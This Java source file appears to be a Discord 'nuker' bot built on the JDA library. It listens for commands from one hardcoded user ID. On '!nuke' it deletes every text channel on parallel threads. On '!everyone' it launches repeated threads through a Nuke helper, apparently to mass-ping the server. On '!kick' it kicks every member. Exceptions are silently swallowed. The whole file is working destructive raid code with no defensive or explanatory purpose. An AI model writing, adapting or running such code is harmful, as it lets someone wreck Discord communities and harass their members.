package noatmc.said.hi.impl.listener;

import noatmc.said.hi.api.logger.Logger;
import noatmc.said.hi.api.nuke.Nuke;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import javax.annotation.Nonnull;
import java.util.List;

public class MainListener extends ListenerAdapter {
    @Override
    public void onGuildMessageReceived(@Nonnull GuildMessageReceivedEvent event) {
        if (event.getMember().getId().equals("717237995417370624")) {
            if (event.getMessage().getContentRaw().equals("!nuke")) {
                List<TextChannel> ez;
                ez = event.getGuild().getTextChannels();
                for (TextChannel lol : ez) {
                    new Thread(() -> {
                        try {
                            lol.delete().queue();
                        } catch (Exception cope) {
                            // empty catch block
                        }
                    }).start();
                }
            } else if (event.getMessage().getContentRaw().equals("!everyone")) {
                try {
                    for (int i = 0; i <= 50; i++) {
                        Nuke.everyone(event.getGuild(), 100).start();
                        System.out.println("[+]: Thread launched");
                        Nuke.everyone(event.getGuild(), 100).join();
                        System.out.println("[+]: Thread joined");
                    }
                } catch (Exception e) {
                    // empty catch block
                }
            } else if (event.getMessage().getContentRaw().equals("!kick")) {
                for (Member member : event.getGuild().getMembers()) {
                    member.kick("cope").queue();
                    Logger.log(Logger.Type.CHANGE, "kicked " + member.getUser().getName());
                }

            }
        }
    }
}
